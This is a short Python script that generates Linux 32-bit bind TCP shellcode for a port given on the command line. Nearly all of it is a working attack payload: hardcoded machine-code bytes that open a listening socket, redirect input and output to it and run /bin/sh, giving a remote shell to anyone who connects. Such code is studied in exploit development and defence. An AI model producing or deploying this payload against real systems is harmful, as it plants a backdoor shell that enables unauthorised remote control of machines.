#!/bin/python
# Linux 32-bit Shell Bind TCP Shellcode Generator
# Written by Hussien Yousef
import sys
shellcode1="\\x31\\xc0\\xb0\\x66\\x31\\xdb\\x53\\xb3\\x01\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc2\\x31\\xc0\\xb0\\x66\\x31\\xdb\\x53\\xb3\\x02\\x66\\x68"
shellcode2="\\x66\\x6a\\x02\\x89\\xe6\\x6a\\x10\\x56\\x52\\x89\\xe1\\xcd\\x80\\x31\\xc0\\x50\\xb0\\x66\\x43\\x43\\x52\\x89\\xe1\\xcd\\x80\\x31\\xc0\\x50\\x50\\xb0\\x66\\x43\\x52\\x89\\xe1\\xcd\\x80\\x89\\xc3\\x31\\xc9\\xb1\\x02\\x31\\xc0\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf7\\xeb\\x0b\\x31\\xc0\\xb0\\x0b\\x5b\\x31\\xc9\\x31\\xd2\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68"

if len(sys.argv) != 2:
	print("Usage: python "+str(sys.argv[0])+" <port>")
else:
	print("Your Linux 32-bit Bind TCP Shell:")
	port_num = str(hex(int(sys.argv[1])))
	port_hex = "\\x"+port_num[2:4]+"\\x"+port_num[4:6]
	print(shellcode1+port_hex+shellcode2)
